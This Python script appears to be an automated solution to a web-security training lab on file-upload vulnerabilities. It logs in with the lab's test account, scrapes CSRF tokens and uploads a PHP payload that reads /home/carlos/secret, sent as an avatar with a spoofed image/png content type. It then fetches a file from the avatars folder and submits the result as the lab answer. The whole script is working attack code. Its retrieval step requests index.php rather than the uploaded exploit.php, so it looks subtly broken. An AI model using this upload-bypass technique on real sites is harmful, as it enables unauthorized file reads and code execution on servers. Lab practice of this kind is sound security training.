import requests
import re

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

session = requests.Session()

#  fetch the csrf token 

csrf_token = session.get(app_url +"/login",verify=False,proxies=proxies)
match = re.search(r'name="csrf" value="(.*?)"',csrf_token.text)  # way to find csrf token
match_pattern = match.group(1)
print(match_pattern)

# login session  for winer user 
data = {"username":"wiener","password":"peter","csrf":match_pattern}
wiener = session.post(app_url+"/login",data=data,verify=False,proxies=proxies)
cookie = session.cookies.get_dict()
print(cookie)

# now we fetch upload csrf token 

upload_token = session.get(app_url+"/my-account?id=wiener",verify=False,proxies=proxies)
upload_match = re.search(r'name="csrf" value="(.*?)"',upload_token.text)
upload_pattern = upload_match.group(1)
print(upload_pattern)

"""
files = {
    'field_name': ('filename.ext', file_content, 'mime/type'),
    'text_field1': (None, 'value1'),
    'text_field2': (None, 'value2')
}
"""

# now we try to upload the files

exploit = "<?php echo file_get_contents('/home/carlos/secret'); ?>"


files = {
    'avatar':('exploit.php', exploit, 'image/png'),
    'user': (None, 'wiener'),
    'csrf': (None,upload_pattern)
}

# after login now we are going to exploit 

response = session.post(app_url+"/my-account/avatar",files=files,proxies=proxies,verify=False)
if "The file avatars/exploit.php has been uploaded" in response.text:
    print("file uploaded successfully")

# now we fetch the content from files/avatars/index.php
    
fetch_upload = session.get(app_url+"/files/avatars/index.php",proxies=proxies,verify=False)
flag = fetch_upload.text
print(flag)

# now submitSolution 

submit_flag = session.post(app_url+"/submitSolution",proxies=proxies,verify=False,data={"answer": flag})
if '"correct":true' in submit_flag.text:
    print("flag submit sucessfully")